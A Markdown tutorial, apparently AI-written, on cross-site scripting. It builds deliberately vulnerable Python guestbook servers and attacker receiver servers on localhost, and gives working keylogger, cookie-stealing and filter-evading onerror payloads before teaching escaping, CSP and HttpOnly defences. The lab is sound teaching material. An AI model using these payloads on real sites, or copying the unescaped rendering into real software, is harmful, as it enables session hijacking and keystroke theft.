Here is the complete Markdown file. You can click the "Copy" button in the top right corner of the block below and paste it directly into a new `.md` file on GitHub.

```markdown
# Tutorial 6: The Trojan Horse (Cross-Site Scripting / XSS)

**Prerequisites:** Understanding of HTTPS from the previous lesson, basic HTML/JavaScript.

---

## 0. The Critical Question From Last Time

**Student Question:** "We learned HTTPS encrypts everything. So we're safe now, right?"

**The Uncomfortable Truth:** No.

Let me show you why.

---

## 1. The Setup: What We Know So Far

From the last lesson, you learned:
- ✅ HTTP sends data as **plain text** (like a postcard)
- ✅ HTTPS **encrypts** data in transit (like a locked box)
- ✅ Man-in-the-middle attackers can't read encrypted traffic

**So what's the problem?**

### The Poisoned Birthday Cake Analogy

Imagine this scenario:

1. **Alice** wants to send **Bob** a birthday cake
2. She puts it in a **locked armored truck** (HTTPS)
3. No one can peek inside during delivery ✅
4. Bob receives the cake and unlocks the truck ✅
5. Bob eats the cake... and **gets poisoned** ☠️

**The Question:** Was the delivery secure?

**The Answer:** YES! The truck was encrypted, no one intercepted it.

**The Real Question:** Was the *cake itself* safe?

**The Real Answer:** NO! The problem wasn't the delivery—it was the **content**.

---

## 2. XSS: The Attack That HTTPS Can't Stop

### What is Cross-Site Scripting (XSS)?



**Definition:** XSS is when an attacker injects malicious code into a website, and that code runs in *other users' browsers*.

**Why HTTPS doesn't help:**
- HTTPS encrypts data **in transit** (between browser and server)
- XSS attacks the data **at rest** (stored on the server or reflected back)
- When the server sends malicious code to a victim, HTTPS **helpfully encrypts and delivers it**

### The Three Brothers of XSS

There are 3 types of XSS attacks. Think of them as three ways to poison a restaurant:

#### **Type 1: Reflected XSS** (The Instant Poisoning)
- Attacker tricks victim into clicking a malicious link
- The malicious code is in the URL itself
- Server "reflects" it back immediately
- Like: Tricking someone into eating poison you hand them directly

#### **Type 2: Stored XSS** (The Contaminated Kitchen)
- Attacker stores malicious code on the server (in comments, profile, etc.)
- Every visitor gets poisoned automatically
- Like: Poisoning the ingredients in a restaurant kitchen
- **This is the most dangerous** ⚠️

#### **Type 3: DOM-Based XSS** (The Self-Poisoning)
- The vulnerability is in client-side JavaScript
- Server never sees the attack
- Like: A recipe book with instructions that accidentally poison you

Today we'll focus on **Stored XSS** because it's the most dramatic and educational.

---

## 3. The Vulnerable Application (Building the Trap)

Let's build a simple guestbook/comment system. We'll intentionally make it vulnerable to show how XSS works.

### 🛠️ Step 1: The Dangerous Server

Create a file called `vulnerable_guestbook.py`:

```python
"""
VULNERABLE GUESTBOOK APPLICATION
This is INTENTIONALLY insecure for educational purposes.
NEVER deploy code like this to production!

The vulnerability: We store user input without sanitization
and render it directly into HTML without escaping.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote
import json

# In-memory storage for comments (in real apps, this would be a database)
comments = []

class GuestbookHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """
        Handle GET requests - show the guestbook page
        """
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # Build the HTML page
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Guestbook</title>
                <style>
                    body { 
                        font-family: Arial, sans-serif; 
                        max-width: 800px; 
                        margin: 50px auto; 
                        padding: 20px;
                        background-color: #f5f5f5;
                    }
                    .comment-form {
                        background: white;
                        padding: 20px;
                        border-radius: 8px;
                        margin-bottom: 30px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                    }
                    .comment {
                        background: white;
                        padding: 15px;
                        margin-bottom: 10px;
                        border-radius: 4px;
                        border-left: 4px solid #007bff;
                    }
                    .author {
                        font-weight: bold;
                        color: #007bff;
                        margin-bottom: 5px;
                    }
                    input, textarea {
                        width: 100%;
                        padding: 10px;
                        margin-bottom: 10px;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        box-sizing: border-box;
                    }
                    button {
                        background-color: #007bff;
                        color: white;
                        padding: 10px 20px;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                        font-size: 16px;
                    }
                    button:hover {
                        background-color: #0056b3;
                    }
                </style>
            </head>
            <body>
                <h1>📝 Guestbook</h1>
                <p>Leave a message below!</p>
                
                <div class="comment-form">
                    <form action="/post" method="POST">
                        <input type="text" name="author" placeholder="Your name" required>
                        <textarea name="message" placeholder="Your message" rows="4" required></textarea>
                        <button type="submit">Post Message</button>
                    </form>
                </div>
                
                <h2>Messages:</h2>
            """
            
            # Display all comments
            # 🚨 VULNERABILITY: We're directly inserting user input into HTML
            # without any sanitization or escaping!
            if comments:
                for comment in comments:
                    html += f"""
                    <div class="comment">
                        <div class="author">{comment['author']}</div>
                        <div class="message">{comment['message']}</div>
                    </div>
                    """
            else:
                html += "<p><em>No messages yet. Be the first to post!</em></p>"
            
            html += """
            </body>
            </html>
            """
            
            self.wfile.write(html.encode('utf-8'))
        
        elif self.path == '/api/comments':
            # API endpoint to get comments as JSON (useful for testing)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(comments).encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")
    
    def do_POST(self):
        """
        Handle POST requests - save new comments
        """
        if self.path == '/post':
            # Read the form data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse the form data
            # Format: author=John&message=Hello
            params = parse_qs(post_data)
            
            # Extract author and message
            # 🚨 VULNERABILITY: We're storing user input WITHOUT validation
            author = params.get('author', ['Anonymous'])[0]
            message = params.get('message', [''])[0]
            
            # URL decode (e.g., %20 becomes space)
            author = unquote(author)
            message = unquote(message)
            
            # Store the comment
            # 🚨 VULNERABILITY: No sanitization, no escaping, nothing!
            comments.append({
                'author': author,
                'message': message
            })
            
            print(f"📝 New comment from {author}: {message}")
            
            # Redirect back to homepage
            self.send_response(303)
            self.send_header('Location', '/')
            self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

# Start the server
if __name__ == '__main__':
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), GuestbookHandler)
    print(f"🌐 Vulnerable Guestbook running on http://localhost:{PORT}")
    print("⚠️  WARNING: This server is INTENTIONALLY vulnerable for education!")
    print("    NEVER use this code in production!\n")
    server.serve_forever()

```

### 🧪 Test the Innocent Version

1. Run the server: `python3 vulnerable_guestbook.py`
2. Open your browser: `http://localhost:8080`
3. Post a normal comment:
* Author: "Alice"
* Message: "Hello, world!"


4. See it appear on the page ✅

**Everything looks normal, right?**

---

## 4. The Attack: Injecting Malicious Code

Now let's exploit the vulnerability.

### 🎯 Attack Level 1: The Harmless Proof-of-Concept

**Goal:** Prove that JavaScript can be injected.

**The Payload:**

```html
<script>alert('XSS Attack!');</script>

```

**Steps:**

1. In the guestbook form:
* Author: "Hacker"
* Message: `<script>alert('XSS Attack!');</script>`


2. Click "Post Message"
3. **BOOM** 💥 Alert box appears!

**What just happened?**

Let's trace the execution:

```
1. Browser sends: <script>alert('XSS');</script>
2. Server stores it in memory (comments array)
3. Next visitor loads the page
4. Server builds HTML: <div class="message"><script>alert('XSS');</script></div>
5. Browser receives HTML
6. Browser parses HTML and sees <script> tag
7. Browser executes the JavaScript
8. Alert box appears

```

**Key Insight:** The browser doesn't know this script came from an attacker. It thinks it's part of the legitimate page!

---

### 🎯 Attack Level 2: The Keylogger (Real Danger)

Now that we know we can run code on other people's browsers, let's do something malicious. We will record every single key the victim types on the page and send it to an external server we control.

**First, let's build the Attacker's Server.**
This is a lightweight server designed only to listen for incoming keystrokes and print them.

Create `simple_logger.py`:

```python
"""
Attacker's Server - The Keylogger Receiver
This simple server just listens for GET requests and prints the 'key' parameter.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

class LoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL parameters
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if 'key' in params:
            key_pressed = params['key'][0]
            # Print the stolen keystroke to the hacker's terminal!
            print(f"🎯 Captured keystroke: {key_pressed}")
            
        # We must return CORS headers so the victim's browser doesn't block the request
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b"OK")
        
    def log_message(self, format, *args):
        # Suppress default HTTP logging to keep the terminal clean
        pass

if __name__ == '__main__':
    PORT = 9000
    server = HTTPServer(('0.0.0.0', PORT), LoggerHandler)
    print(f"👹 Attacker's Keylogger running on http://localhost:{PORT}")
    print("   Waiting for victims to type...\n")
    server.serve_forever()

```

**Execute the Attack:**

**Step 1:** Run the attacker's server in a new terminal:

```bash
python3 simple_logger.py

```

**Step 2:** Ensure your `vulnerable_guestbook.py` is still running on port 8080.

**Step 3:** Inject the malicious payload. In the guestbook message box, post this:

```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://localhost:9000?key=' + e.key);
});
</script>

```

**Step 4:** Now, pretend you are a normal user visiting the guestbook. Start typing a new comment.

**Step 5:** Watch the terminal running `simple_logger.py`. Every single key you press on the guestbook page is secretly being beamed to the attacker's terminal in real-time!

---

### 🎯 Attack Level 3: Cookie Theft (Advanced Danger)

Keyloggers are great, but the ultimate prize in web hacking is stealing a user's **Session Cookie**. If an attacker gets your session cookie, they can impersonate you completely.

**To demonstrate this, let's upgrade our guestbook to include a login system so there is actually a cookie to steal.**

Create `login_guestbook.py`:

```python
"""
Enhanced guestbook with login system
Now we have sessions/cookies that can be stolen via XSS
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote
import json
import uuid

# Storage
comments = []
sessions = {}  # session_id -> username
users = {
    'alice': 'password123',
    'bob': 'qwerty',
    'admin': 'admin'
}

class SecureGuestbookHandler(BaseHTTPRequestHandler):
    
    def get_session_user(self):
        """
        Check if user is logged in by validating session cookie
        """
        cookie_header = self.headers.get('Cookie')
        if cookie_header and 'session_id=' in cookie_header:
            # Extract session_id from cookie
            session_id = cookie_header.split('session_id=')[1].split(';')[0]
            return sessions.get(session_id)
        return None
    
    def do_GET(self):
        if self.path == '/':
            # Check if user is logged in
            username = self.get_session_user()
            
            if not username:
                # Show login form
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Login - Guestbook</title>
                    <style>
                        body { font-family: Arial; max-width: 400px; margin: 100px auto; }
                        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
                        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
                    </style>
                </head>
                <body>
                    <div class="login-box">
                        <h2>🔐 Login</h2>
                        <form action="/login" method="POST">
                            <input type="text" name="username" placeholder="Username" required>
                            <input type="password" name="password" placeholder="Password" required>
                            <button type="submit">Login</button>
                        </form>
                        <p><small>Try: alice/password123 or bob/qwerty</small></p>
                    </div>
                </body>
                </html>
                """
                self.wfile.write(html.encode())
                return
            
            # User is logged in - show guestbook
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Guestbook</title>
                <style>
                    body {{ font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }}
                    .header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }}
                    .user-info {{ background: white; padding: 10px 20px; border-radius: 4px; }}
                    .comment-form {{ background: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                    .comment {{ background: white; padding: 15px; margin-bottom: 10px; border-radius: 4px; border-left: 4px solid #007bff; }}
                    .author {{ font-weight: bold; color: #007bff; }}
                    textarea {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
                    button {{ background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }}
                    .logout {{ background: #dc3545; padding: 5px 15px; color: white; text-decoration: none; border-radius: 4px; }}
                    .security-badge {{ background: #007bff; color: white; padding: 5px 10px; border-radius: 4px; font-size: 12px; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>📝 Guestbook</h1>
                    <div class="user-info">
                        Logged in as: <strong>{username}</strong> 
                        <a href="/logout" class="logout">Logout</a>
                    </div>
                </div>
                
                <div class="comment-form">
                    <form action="/post" method="POST">
                        <textarea name="message" placeholder="Your message" rows="4" required></textarea>
                        <button type="submit">Post Message</button>
                    </form>
                </div>
                
                <h2>Messages:</h2>
            """
            
            # 🚨 VULNERABILITY: Direct HTML injection
            if comments:
                for comment in comments:
                    html += f"""
                    <div class="comment">
                        <div class="author">{comment['author']}</div>
                        <div class="message">{comment['message']}</div>
                    </div>
                    """
            else:
                html += "<p><em>No messages yet.</em></p>"
            
            html += """
            </body>
            </html>
            """
            
            self.wfile.write(html.encode())
        
        elif self.path == '/logout':
            self.send_response(303)
            self.send_header('Location', '/')
            self.send_header('Set-Cookie', 'session_id=; Max-Age=0')
            self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()
            
            self.wfile.write(b"404 Not Found")
    
    def do_POST(self):
        """
        Handle POST requests - save new comments
        """
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)
        
        if self.path == '/login':
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            # Check credentials
            if users.get(username) == password:
                # Create session
                session_id = str(uuid.uuid4())
                sessions[session_id] = username
                
                self.send_response(303)
                self.send_header('Location', '/')
                # 🚨 VULNERABILITY: No HttpOnly flag!
                # JavaScript can read this cookie via document.cookie
                self.send_header('Set-Cookie', f'session_id={session_id}')
                self.end_headers()
            else:
                self.send_response(401)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<h1>Login failed!</h1><a href='/'>Try again</a>")
        
        elif self.path == '/post':
            username = self.get_session_user()
            if username:
                message = params.get('message', [''])[0]
                message = unquote(message)
                
                # 🚨 VULNERABILITY: No sanitization!
                comments.append({
                    'author': username,
                    'message': message
                })
                
                self.send_response(303)
                self.send_header('Location', '/')
                self.end_headers()
            else:
                self.send_response(401)
                self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), SecureGuestbookHandler)
    print(f"🌐 Guestbook with Login running on http://localhost:{PORT}")
    print("⚠️  Still vulnerable to XSS!\n")
    server.serve_forever()

```

**Now let's upgrade the attacker's server to receive stolen cookies:**

Modify `simple_logger.py` into `stealer_server.py`:

```python
"""
Attacker's server - receives stolen cookies AND keystrokes
This simulates an attacker-controlled server
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

stolen_data = []

class StealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL to get query parameters
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        victim_ip = self.client_address[0]
        
        if 'cookie' in params:
            cookie = params['cookie'][0]
            stolen_data.append({'type': 'cookie', 'value': cookie, 'ip': victim_ip})
            print(f"\n🚨 STOLEN COOKIE ALERT!")
            print(f"   Victim IP: {victim_ip}")
            print(f"   Cookie: {cookie}\n")
            
        elif 'key' in params:
            key = params['key'][0]
            print(f"🎯 Captured keystroke: {key}")
        
        # Return empty response (attacker doesn't care about the response)
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        # CORS header allows requests from any origin
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    PORT = 9000
    server = HTTPServer(('0.0.0.0', PORT), StealerHandler)
    print(f"👹 Attacker's Server running on http://localhost:{PORT}")
    print("   Waiting for stolen data...\n")
    server.serve_forever()

```

### 🎯 Execute the Cookie Theft Attack

**Step 1:** Run both servers:

```bash
# Terminal 1
python3 login_guestbook.py

# Terminal 2
python3 stealer_server.py

```

**Step 2:** Login as Alice:

* Go to `http://localhost:8080`
* Username: `alice`
* Password: `password123`

**Step 3:** Inject the malicious payload:

In the message box, paste this:

```html
<script>
fetch('http://localhost:9000?cookie=' + document.cookie);
</script>

```

**Step 4:** Watch Terminal 2 (the attacker's server):

```
🚨 STOLEN COOKIE ALERT!
   Victim IP: 127.0.0.1
   Cookie: session_id=a1b2c3d4-e5f6-7890-abcd-ef1234567890

```

**Step 5:** Use the stolen cookie:

Open a **new Incognito window** (to simulate being a different person):

1. Open Developer Tools (F12)
2. Go to Console tab
3. Type:

```javascript
document.cookie = "session_id=a1b2c3d4-e5f6-7890-abcd-ef1234567890"

```

4. Refresh the page
5. **You're now logged in as Alice!** Without knowing her password!

---

### 🎯 Attack Level 4: The Invisible Attack

The previous attacks were visible (you could see the script in the comment) and relied on the `<script>` tag. Let's make it invisible and evade basic filters that look for `<script>`:

```html
<img src="x" onerror="fetch('http://localhost:9000?cookie=' + document.cookie)" style="display:none">

```

**What happens:**

1. Browser tries to load image from URL "x" (which doesn't exist)
2. Image fails to load, triggering `onerror` event
3. The JavaScript executes
4. Cookie is stolen
5. The image tag has `display:none`, so nothing visible appears!

---

## 5. Why HTTPS Didn't Save Us

Let's review what happened:

```
1. Attacker posts malicious script → Encrypted by HTTPS ✅
2. Server stores the script → Still encrypted in transit ✅
3. Victim logs in → Encrypted by HTTPS ✅
4. Victim loads page with malicious script → Encrypted by HTTPS ✅
5. Browser executes the malicious script → No encryption can stop this! ❌
6. Script steals cookie and sends it to attacker → Encrypted by HTTPS ✅

```

**The Paradox:** HTTPS successfully encrypted the attack payload, the victim's session, and the stolen data. But none of that mattered because the vulnerability was in **what the server did with the data**, not how it was transmitted.

**Key Lesson:** Security is about **layers**. HTTPS solves transport security. XSS is an **application security** problem.

---

## 6. The Defenses: How to Stop XSS

Now let's fix our vulnerable code. There are multiple defense layers:

### 🛡️ Defense Layer 1: HTML Escaping (Primary Defense)

The most important fix: **Never trust user input. Always escape it.**

**What is escaping?**

Converting dangerous characters into safe equivalents:

```
<  becomes  &lt;
>  becomes  &gt;
"  becomes  &quot;
'  becomes  &#x27;
&  becomes  &amp;

```

**Why this works:**

```html
<script>alert('XSS')</script>

&lt;script&gt;alert('XSS')&lt;/script&gt;

<script>alert('XSS')</script>  (as text, not code!)

```

Create `safe_guestbook.py`:

```python
"""
SAFE GUESTBOOK - With proper XSS protection
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote
import html  # Python's built-in HTML escaping library
import uuid

comments = []
sessions = {}  # session_id -> username
users = {
    'alice': 'password123',
    'bob': 'qwerty',
    'admin': 'admin'
}

class SafeGuestbookHandler(BaseHTTPRequestHandler):
    
    def get_session_user(self):
        """
        Check if user is logged in by validating session cookie
        """
        cookie_header = self.headers.get('Cookie')
        if cookie_header and 'session_id=' in cookie_header:
            session_id = cookie_header.split('session_id=')[1].split(';')[0]
            return sessions.get(session_id)
        return None
    
    def do_GET(self):
        if self.path == '/':
            username = self.get_session_user()
            
            if not username:
                # Login form (same as before)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html_content = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Secure Guestbook - Login</title>
                    <meta charset="UTF-8">
                    <style>
                        body { font-family: Arial; max-width: 400px; margin: 100px auto; }
                        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
                        button { width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
                    </style>
                </head>
                <body>
                    <div class="login-box">
                        <h2>🔐 Secure Login</h2>
                        <form action="/login" method="POST">
                            <input type="text" name="username" placeholder="Username" required>
                            <input type="password" name="password" placeholder="Password" required>
                            <button type="submit">Login</button>
                        </form>
                        <p><small>Try: alice/password123</small></p>
                    </div>
                </body>
                </html>
                """
                self.wfile.write(html_content.encode())
                return
            
            # Guestbook page
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            # 🛡️ DEFENSE: Content Security Policy
            # This tells browser to block inline scripts
            self.send_header('Content-Security-Policy', "default-src 'self'; script-src 'self'")
            self.end_headers()
            
            # 🛡️ DEFENSE: Escape the username before inserting into HTML
            safe_username = html.escape(username)
            
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Secure Guestbook</title>
                <meta charset="UTF-8">
                <style>
                    body {{ font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }}
                    .header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: white; padding: 15px; border-radius: 8px; }}
                    .user-info {{ color: #28a745; font-weight: bold; }}
                    .comment-form {{ background: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                    .comment {{ background: white; padding: 15px; margin-bottom: 10px; border-radius: 4px; border-left: 4px solid #28a745; }}
                    .author {{ font-weight: bold; color: #28a745; }}
                    .message {{ margin-top: 5px; white-space: pre-wrap; word-wrap: break-word; }}
                    textarea {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
                    button {{ background: #28a745; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }}
                    .logout {{ background: #dc3545; padding: 5px 15px; color: white; text-decoration: none; border-radius: 4px; }}
                    .security-badge {{ background: #28a745; color: white; padding: 5px 10px; border-radius: 4px; font-size: 12px; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <div>
                        <h1>📝 Secure Guestbook <span class="security-badge">XSS Protected</span></h1>
                        <small>Using HTML escaping + CSP + HttpOnly cookies</small>
                    </div>
                    <div class="user-info">
                        👤 {safe_username}
                        <a href="/logout" class="logout">Logout</a>
                    </div>
                </div>
                
                <div class="comment-form">
                    <h3>Post a Message</h3>
                    <form action="/post" method="POST">
                        <textarea name="message" placeholder="Your message (try injecting a script!)" rows="4" required></textarea>
                        <button type="submit">Post Message</button>
                    </form>
                </div>
                
                <h2>Messages:</h2>
            """
            
            if comments:
                for comment in comments:
                    # 🛡️ DEFENSE: Escape ALL user-generated content
                    safe_author = html.escape(comment['author'])
                    safe_message = html.escape(comment['message'])
                    
                    html_content += f"""
                    <div class="comment">
                        <div class="author">{safe_author}</div>
                        <div class="message">{safe_message}</div>
                    </div>
                    """
            else:
                html_content += "<p><em>No messages yet. Be the first to post!</em></p>"
            
            html_content += """
            <div style="margin-top: 30px; padding: 15px; background: #e8f5e9; border-radius: 4px;">
                <h3>🛡️ Security Features Active:</h3>
                <ul>
                    <li><strong>HTML Escaping:</strong> All user input is escaped before display</li>
                    <li><strong>CSP Header:</strong> Content-Security-Policy blocks inline scripts</li>
                    <li><strong>HttpOnly Cookies:</strong> JavaScript cannot access session cookies</li>
                    <li><strong>Input Validation:</strong> Server validates all input</li>
                </ul>
                <p><strong>Try to inject XSS:</strong> Post a message with <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> and see what happens!</p>
            </div>
            </body>
            </html>
            """
            
            self.wfile.write(html_content.encode())
        
        elif self.path == '/logout':
            self.send_response(303)
            self.send_header('Location', '/')
            self.send_header('Set-Cookie', 'session_id=; Max-Age=0')
            self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)
        
        if self.path == '/login':
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            if users.get(username) == password:
                session_id = str(uuid.uuid4())
                sessions[session_id] = username
                
                self.send_response(303)
                self.send_header('Location', '/')
                # 🛡️ DEFENSE: HttpOnly flag prevents JavaScript access
                # 🛡️ DEFENSE: Secure flag ensures cookie only sent over HTTPS (in production)
                # 🛡️ DEFENSE: SameSite prevents CSRF attacks
                self.send_header('Set-Cookie', 
                    f'session_id={session_id}; HttpOnly; SameSite=Strict')
                self.end_headers()
                
                print(f"✅ User '{username}' logged in with secure cookie")
            else:
                self.send_response(401)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<h1>Login failed!</h1><a href='/'>Try again</a>")
        
        elif self.path == '/post':
            username = self.get_session_user()
            if username:
                message = params.get('message', [''])[0]
                message = unquote(message)
                
                # 🛡️ DEFENSE: Validate input length
                if len(message) > 1000:
                    self.send_response(400)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"<h1>Message too long!</h1>")
                    return
                
                # 🛡️ DEFENSE: We still store the raw input
                # The escaping happens when we DISPLAY it, not when we store it
                comments.append({
                    'author': username,
                    'message': message
                })
                
                print(f"📝 New comment from {username}")
                
                self.send_response(303)
                self.send_header('Location', '/')
                self.end_headers()
            else:
                self.send_response(401)
                self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), SafeGuestbookHandler)
    print(f"🛡️  SECURE Guestbook running on http://localhost:{PORT}")
    print("✅ Protected against XSS attacks!\n")
    print("Security features:")
    print("  - HTML escaping of all user input")
    print("  - Content-Security-Policy header")
    print("  - HttpOnly cookies")
    print("  - Input validation\n")
    server.serve_forever()

```

### 🧪 Test the Defense

1. Run the secure version: `python3 safe_guestbook.py`
2. Login as Alice
3. Try to inject: `<script>alert('XSS')</script>`
4. **Result:** The script appears as TEXT, not executed!

**What the browser receives:**

```html
<div class="message">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>

```

The browser displays: `<script>alert('XSS')</script>` (as text)

---

### 🛡️ Defense Layer 2: Content Security Policy (CSP)

CSP is an HTTP header that tells the browser what types of content are allowed.

```python
self.send_header('Content-Security-Policy', "default-src 'self'; script-src 'self'")

```

**What this means:**

* `default-src 'self'`: Only load resources from the same origin
* `script-src 'self'`: Only execute scripts from the same origin

**Even if escaping fails**, CSP blocks:

* Inline scripts (`<script>...</script>`)
* External scripts from attacker domains
* `eval()` and similar dangerous functions

**Test it:**

Even in the vulnerable version, if you add this CSP header, the XSS attacks won't work! The browser will show:

```
Refused to execute inline script because it violates the following 
Content Security Policy directive: "script-src 'self'"

```

---

### 🛡️ Defense Layer 3: HttpOnly Cookies

This prevents JavaScript from accessing cookies:

```python
self.send_header('Set-Cookie', 
    f'session_id={session_id}; HttpOnly; SameSite=Strict')

```

**Test it:**

Open browser console and type:

```javascript
document.cookie

```

**Without HttpOnly:** You see `session_id=abc123...`

**With HttpOnly:** You see nothing (cookie is hidden from JavaScript)

**Why this matters:** Even if an attacker injects XSS, they can't steal the session cookie!

---

### 🛡️ Defense Layer 4: Input Validation

Don't just escape—also validate:

```python
# Reject obviously malicious input
if '<script' in message.lower() or 'javascript:' in message.lower():
    return error("Suspicious input detected")

# Limit length
if len(message) > 1000:
    return error("Message too long")

# Whitelist allowed characters (if possible)
if not re.match(r'^[a-zA-Z0-9\s.,!?-]+$', message):
    return error("Invalid characters")

```

**Defense in depth:** Even if one layer fails, others catch it.

---

## 7. The Three Types of XSS (Detailed)

Now that you understand the basic concept, let's explore all three types:

### Type 1: Reflected XSS

**How it works:**

1. Attacker crafts a malicious URL
2. Victim clicks the link
3. Server "reflects" the malicious script back in the response
4. Script executes in victim's browser

**Example:**

Vulnerable search page:

```python
# Vulnerable code
search_term = request.args.get('q', '')
return f"<h1>Results for: {search_term}</h1>"

```

**Attack URL:**

```
[https://example.com/search?q=](https://example.com/search?q=)<script>alert('XSS')</script>

```

**What happens:**

1. Victim clicks link (maybe shortened with bit.ly)
2. Server responds with: `<h1>Results for: <script>alert('XSS')</script></h1>`
3. Browser executes the script

**Why it's dangerous:**

* Easy to spread via phishing emails
* Looks like legitimate URL
* Can steal credentials on login pages

**Defense:**

```python
from html import escape
search_term = escape(request.args.get('q', ''))
return f"<h1>Results for: {search_term}</h1>"

```

---

### Type 2: Stored XSS (What we practiced)

**How it works:**

1. Attacker stores malicious script on server (comment, profile, etc.)
2. Script sits in database
3. Every visitor gets attacked automatically
4. Most dangerous because it's persistent

**Example:** Our guestbook attack above.

**Why it's dangerous:**

* Attacks ALL users automatically
* Persists forever (until removed)
* Trusted users get attacked (they're on a legitimate site)

---

### Type 3: DOM-Based XSS

**How it works:**

* Vulnerability is in client-side JavaScript
* Server never sees the attack
* JavaScript directly manipulates the DOM with untrusted data

**Example:**

Vulnerable client-side code:

```html
<script>
// Get name from URL fragment (e.g., #name=Alice)
const name = location.hash.split('=')[1];
document.getElementById('welcome').innerHTML = "Welcome " + name;
</script>

```

**Attack URL:**

```
[https://example.com/#name=](https://example.com/#name=)<img src=x onerror=alert('XSS')>

```

**What happens:**

1. JavaScript reads `location.hash`
2. Extracts: `<img src=x onerror=alert('XSS')>`
3. Injects it into innerHTML
4. Browser executes the onerror handler

**Why it's tricky:**

* Server logs don't show it (it's in the # fragment)
* WAFs (Web Application Firewalls) can't detect it
* Requires code review to find

**Defense:**

```javascript
// Use textContent instead of innerHTML
document.getElementById('welcome').textContent = "Welcome " + name;

// Or escape it
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

```

---

